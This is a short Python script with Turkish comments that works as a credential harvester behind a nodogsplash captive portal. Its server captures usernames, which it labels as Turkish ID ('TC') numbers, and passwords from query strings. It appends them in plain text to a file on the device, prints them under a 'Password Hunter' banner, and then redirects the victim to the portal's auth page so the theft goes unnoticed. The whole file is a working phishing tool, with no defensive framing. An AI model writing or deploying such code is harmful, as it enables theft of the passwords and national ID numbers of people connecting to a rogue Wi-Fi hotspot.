from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os

class LoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # URL'deki parametreleri ayrıştır
        parsed_path = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed_path.query)
        
        user = params.get('j_username', [''])[0]
        pw = params.get('j_password', [''])[0]

        # Şifre girilmişse dosyaya kaydet
        if user and pw:
            log_data = f"Zaman: {os.popen('date').read().strip()} | TC: {user} | Sifre: {pw}\n"
            # Dosya yolunun doğruluğundan ve izninden emin ol
            try:
                with open("/etc/nodogsplash/passwords.txt", "a") as f:
                    f.write(log_data)
                print(f"[*] BAŞARILI: {user} / {pw}")
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")

        self.send_response(302)
        # NDS portu olan 2050 üzerinden yetkilendirme linkine fırlatılır
        self.send_header('Location', 'http://192.168.12.1:2050/nodogsplash_auth/')
        self.end_headers()

def run():
    server_address = ('0.0.0.0', 8000)
    httpd = HTTPServer(server_address, LoggerHandler)
    print("------------------------------------------")
    print("[+] Şifre Avcısı 8000 Portunda Aktif")
    print("[+] Bekleniyor...")
    print("------------------------------------------")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
